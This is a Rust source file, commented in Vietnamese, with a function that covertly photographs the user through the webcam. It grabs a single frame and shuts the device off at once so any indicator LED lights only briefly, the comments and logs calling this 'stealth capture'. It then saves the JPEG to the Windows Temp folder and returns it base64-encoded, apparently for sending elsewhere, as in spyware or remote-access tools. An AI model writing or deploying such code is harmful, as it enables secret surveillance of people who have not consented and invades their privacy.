use std::thread;
use std::time::Duration;
use image::{ImageBuffer, Rgba};
// Import struct Device từ escapi
use escapi::Device;

pub fn capture_stealth_image() -> Result<(String, String), String> {
    log::info!("[Camera] Bắt đầu chụp lén (Stealth capture)...");

    let num_cameras = escapi::num_devices();
    if num_cameras == 0 {
        return Err("Không tìm thấy thiết bị Camera nào trên máy!".to_string());
    }

    let width: u32 = 640;
    let height: u32 = 480;
    let fps: u64 = 30;

    log::info!("[Camera] Đang khởi tạo thiết bị Camera index 0...");
    
    // Khởi tạo camera (escapi 4.0.0)
    let camera: Device = match escapi::init(0, width, height, fps) {
        Ok(cam) => cam,
        Err(e) => return Err(format!("Lỗi khởi tạo camera phần cứng: {:?}", e)),
    };

    // Đợi 800ms để cảm biến camera khởi động, lấy sáng và cân bằng màu
    thread::sleep(Duration::from_millis(800));

    // Ra lệnh chụp ảnh và lấy dữ liệu
    let pixels_bgra = match camera.capture() {
        Ok(pixels) => pixels.to_vec(),
        Err(e) => return Err(format!("Capture failed: {:?}", e)),
    };

    // Ngay lập tức ngắt camera để đèn LED (nếu có) bị tắt nhanh nhất có thể
    drop(camera); 
    log::info!("[Camera] Đã ngắt phần cứng Camera.");

    // Bây giờ ta rảnh tay xử lý mảng pixels thành file JPEG
    // Độ dài của pixels_bgra sẽ là width * height * 4 (RGBA)
    let mut image_data = pixels_bgra;
    
    // Hoán đổi kênh màu: B (byte 0) và R (byte 2) trong mỗi pixel (4 bytes)
    for chunk in image_data.chunks_exact_mut(4) {
        chunk.swap(0, 2); 
    }

    // Tạo bộ đệm ảnh của thư viện `image`
    let img_buffer: ImageBuffer<Rgba<u8>, Vec<u8>> = match ImageBuffer::from_raw(width, height, image_data) {
        Some(buf) => buf,
        None => return Err("Lỗi khi tạo bộ đệm ảnh từ pixel data.".to_string()),
    };

    // Đổi RGBA sang RGB để bóp dung lượng và cho phép chuẩn JPEG
    let dyn_img = image::DynamicImage::ImageRgba8(img_buffer);
    let rgb_img = dyn_img.into_rgb8();

    // Lưu ảnh vào thư mục Temp
    let temp_image_path = "C:\\Windows\\Temp\\stealth_capture.jpg";
    if let Err(e) = rgb_img.save(temp_image_path) {
        log::error!("Không thể lưu file JPEG: {}", e);
    } else {
        log::info!("[Camera] Lưu ảnh thành công tại: {}", temp_image_path);
    }

    // Ghi ảnh vào RAM (Cursor) để mã hoá Base64
    let mut cursor = std::io::Cursor::new(Vec::new());
    match rgb_img.write_to(&mut cursor, image::ImageFormat::Jpeg) {
        Ok(_) => {
            use base64::{Engine as _, engine::general_purpose};
            let b64 = general_purpose::STANDARD.encode(cursor.into_inner());
            Ok((temp_image_path.to_string(), b64))
        },
        Err(e) => Err(format!("Lỗi mã hoá ảnh sang base64: {}", e)),
    }
}
